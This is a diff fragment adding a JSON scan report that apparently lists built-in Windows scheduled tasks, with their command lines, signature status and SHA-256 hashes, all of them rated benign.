+        "signature": "Valid",
+        "sha256": "bc4e1649049f6fe768fe15f45890e3a73e39166bed84082949c91006a3b0a345"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeSystem",
+      "target": "AnalyzeSystem",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2b439f9dc7b3",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Printing\\EduPrintProv",
+      "target": "C:\\WINDOWS\\system32\\eduprintprov.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "commande": "C:\\WINDOWS\\system32\\eduprintprov.exe",
+        "signature": "Valid",
+        "sha256": "60cbfac07f4cedebb8cbff12b56d7126faffe124cc27f8bdee904ee7d7e49d44"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Printing\\PrinterCleanupTask",
+      "target": "PrinterCleanupTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Printing\\PrintJobCleanupTask",
+      "target": "PrintJobCleanupTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\RecoveryEnvironment\\VerifyWinRE",
+      "target": "VerifyWinRE",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:8b1a697e34bd",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\ReFsDedupSvc\\Initialization",
+      "target": "Initialization",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:e26fc955370f",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Registry\\RegIdleBackup",
+      "target": "RegIdleBackup",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:13d95c0604ac",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Servicing\\OOBEFodSetup",
+      "target": "C:\\WINDOWS\\system32\\OOBEFodSetup.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\OOBEFodSetup.exe",
+        "signature": "Valid",
+        "sha256": "47204e404567d0adea48fd2b7821da40bd7456a0e945d709e62f227c4fb590c3"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Servicing\\StartComponentCleanup",
+      "target": "StartComponentCleanup",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Setup\\PITRTask",
+      "target": "PITRTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Setup\\SetupRecoveryDataTask",
+      "target": "SetupRecoveryDataTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\SharedPC\\Account Cleanup",
+      "target": "Account Cleanup",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Shell\\CreateObjectTask",
+      "target": "CreateObjectTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:e40249f1998a",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Shell\\FamilySafetyMonitor",
+      "target": "C:\\WINDOWS\\System32\\wpcmon.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:ba91214c5f9d",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\System32\\wpcmon.exe",
+        "signature": "Valid",
+        "sha256": "9bede22e69474e6985ca013e7b45d5fbe939758f5de078c00e1e4034eb5d05dd"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Shell\\FamilySafetyRefreshTask",
+      "target": "FamilySafetyRefreshTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:dee88184f8a8",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Shell\\IndexerAutomaticMaintenance",
+      "target": "IndexerAutomaticMaintenance",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c42ddb33131a",
+        "compte": "S-1-5-19",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Shell\\ThemesSyncedImageDownload",
+      "target": "ThemesSyncedImageDownload",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:9f4cf6b6485c",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTaskLogon",
+      "target": "SvcRestartTaskLogon",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:4e80e38b2ca9",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\SpacePort\\SpaceAgentTask",
+      "target": "C:\\WINDOWS\\system32\\SpaceAgent.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:e5f4277504cd",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\SpaceAgent.exe",
+        "signature": "Valid",
+        "sha256": "0b8b03b0f931b4da61d225d7cdd9df13925e77bafe47c47397e80e569071ef7f"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\SpacePort\\SpaceManagerTask",
+      "target": "C:\\WINDOWS\\system32\\spaceman.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c181b73e29e6",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\spaceman.exe /Work",
+        "signature": "Valid",
+        "sha256": "3645fe13a3fbac7c8073f0a0283f4f3b294166191c33aa09794641e075422317"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\StateRepository\\MaintenanceTasks",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:018e80c402c5",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe %windir%\\system32\\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Storage Tiers Management\\Storage Tiers Management Initialization",
+      "target": "Storage Tiers Management Initialization",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:937baa05dae0",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Storage Tiers Management\\Storage Tiers Optimization",
+      "target": "C:\\WINDOWS\\system32\\defrag.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:937baa05dae0",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\defrag.exe -c -h -g -# -m 8 -i 13500",
+        "signature": "Valid",
+        "sha256": "cb33deaaba36b887fa13cd2b29cdc1472241f815ece8bd2e78a307622d97e362"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Subscription\\EnableLicenseAcquisition",
+      "target": "C:\\WINDOWS\\system32\\ClipRenew.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:9a45a182c513",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\ClipRenew.exe -e",
+        "signature": "Valid",
+        "sha256": "215a6b88797ba198bff02141b13432dbda19df89fc23318f92de2053ae05a1d3"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Subscription\\LicenseAcquisition",
+      "target": "C:\\WINDOWS\\system32\\ClipRenew.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:9a45a182c513",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\ClipRenew.exe",
+        "signature": "Valid",
+        "sha256": "215a6b88797ba198bff02141b13432dbda19df89fc23318f92de2053ae05a1d3"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Sustainability\\PowerGridForecastTask",
+      "target": "PowerGridForecastTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:5f8433b5aafe",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Sustainability\\SustainabilityTelemetry",
+      "target": "SustainabilityTelemetry",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:8cc6af3dd474",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Sysmain\\HybridDriveCachePrepopulate",
+      "target": "HybridDriveCachePrepopulate",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:de173942495f",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Sysmain\\HybridDriveCacheRebalance",
+      "target": "HybridDriveCacheRebalance",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:de173942495f",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Sysmain\\ResPriStaticDbSync",
+      "target": "ResPriStaticDbSync",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:de173942495f",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Sysmain\\WsSwapAssessmentTask",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:de173942495f",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe sysmain.dll,PfSvWsSwapAssessmentTask",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\SystemRestore\\SR",
+      "target": "C:\\WINDOWS\\system32\\srtasks.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:882326de23ba",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\srtasks.exe ExecuteScheduledSPPCreation",
+        "signature": "Valid",
+        "sha256": "e7e56c2607614a58d4fc0fde58fa32a9057e2ec6501808e666faf1d11af62a0e"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Task Manager\\Interactive",
+      "target": "Interactive",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:1edf06e746f1",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\TextServicesFramework\\MsCtfMonitor",
+      "target": "MsCtfMonitor",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Time Synchronization\\ForceSynchronizeTime",
+      "target": "ForceSynchronizeTime",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:9669890ceab5",
+        "compte": "S-1-5-19",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Time Synchronization\\SynchronizeTime",
+      "target": "C:\\WINDOWS\\system32\\sc.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a3c5258d7775",
+        "compte": "S-1-5-19",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\sc.exe start w32time task_started",
+        "signature": "Valid",
+        "sha256": "a452bfcb6000d03942ddfaddcda5a7eb121447ed99b1ba090446b4a989f1f7ae"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Time Zone\\SynchronizeTimeZone",
+      "target": "C:\\WINDOWS\\system32\\tzsync.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:f696d38e042c",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\tzsync.exe",
+        "signature": "Valid",
+        "sha256": "767f8731a78b9120cac46aac14515d4b56590bdd671a47cf05d4f9bbe36f5bb3"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\UPnP\\UPnPHostConfig",
+      "target": "C:\\WINDOWS\\system32\\sc.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:fde2a66d728f",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\sc.exe config upnphost start= auto",
+        "signature": "Valid",
+        "sha256": "a452bfcb6000d03942ddfaddcda5a7eb121447ed99b1ba090446b4a989f1f7ae"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\USB\\Usb-Notifications",
+      "target": "Usb-Notifications",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:892bca4d3f24",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WCM\\WiFiTask",
+      "target": "C:\\WINDOWS\\System32\\WiFiTask.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:082aa9f5d7b9",
+        "commande": "C:\\WINDOWS\\System32\\WiFiTask.exe",
+        "signature": "Valid",
+        "sha256": "828985c661c1120521b210504fa5c6953717a0f841cdb9bce4507c3cde94e4f6"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WDI\\ResolutionHost",
+      "target": "ResolutionHost",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:d38014d52be7",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance",
+      "target": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe -IdleTask -TaskName WdCacheMaintenance",
+        "signature": "Valid",
+        "sha256": "556d0de327089f436d461486b953a97dbd26c458c2c4f01d59d6d4217025cf26"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",
+      "target": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe -IdleTask -TaskName WdCleanup",
+        "signature": "Valid",
+        "sha256": "556d0de327089f436d461486b953a97dbd26c458c2c4f01d59d6d4217025cf26"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
+      "target": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob",
+        "signature": "Valid",
+        "sha256": "556d0de327089f436d461486b953a97dbd26c458c2c4f01d59d6d4217025cf26"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification",
+      "target": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MpCmdRun.exe -IdleTask -TaskName WdVerification",
+        "signature": "Valid",
+        "sha256": "556d0de327089f436d461486b953a97dbd26c458c2c4f01d59d6d4217025cf26"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting",
+      "target": "C:\\WINDOWS\\system32\\wermgr.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2127a5b69fb5",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\wermgr.exe -upload",
+        "signature": "Valid",
+        "sha256": "c26c26d600d63ca6aa7625dea48ff97bcb4fd3a458db16679f1fa47df9a1a75d"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStartTypeChange",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:f2cefeb1fcfb",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Windows Media Sharing\\UpdateLibrary",
+      "target": "C:\\Program Files\\Windows Media Player\\wmpnscfg.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:51a374b8da6e",
+        "commande": "C:\\Program Files\\Windows Media Player\\wmpnscfg.exe",
+        "signature": "Valid",
+        "sha256": "7c357ad4a20ed83a2a34d1b7307db2d7636cadcbe1384636e39f198708be9407"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WindowsColorSystem\\Calibration Loader",
+      "target": "Calibration Loader",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:abc3e5ef695f",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
+      "target": "C:\\WINDOWS\\System32\\sc.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:47e144ac41ff",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\System32\\sc.exe start wuauserv",
+        "signature": "Valid",
+        "sha256": "a452bfcb6000d03942ddfaddcda5a7eb121447ed99b1ba090446b4a989f1f7ae"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Wininet\\CacheTask",
+      "target": "CacheTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "running",
+        "auteur": "anon:57c8d61fc38d",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WlanSvc\\CDSSync",
+      "target": "CDSSync",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\WlanSvc\\MoProfileManagement",
+      "target": "MoProfileManagement",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Work Folders\\Work Folders Logon Synchronization",
+      "target": "Work Folders Logon Synchronization",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:14283c39c7ea",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Work Folders\\Work Folders Maintenance Work",
+      "target": "Work Folders Maintenance Work",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:43642bf08697",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Workplace Join\\Automatic-Device-Join",
+      "target": "C:\\WINDOWS\\System32\\dsregcmd.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\System32\\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)",
+        "signature": "Valid",
+        "sha256": "ac3346176cb1a5dc50c0e9c98f3204718eedff97409adc92dcdb99be652ca113"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Workplace Join\\Device-Sync",
+      "target": "Device-Sync",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:9245187cbfb8",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Workplace Join\\Recovery-Check",
+      "target": "C:\\WINDOWS\\System32\\dsregcmd.exe",
+      "severity": "Benign",
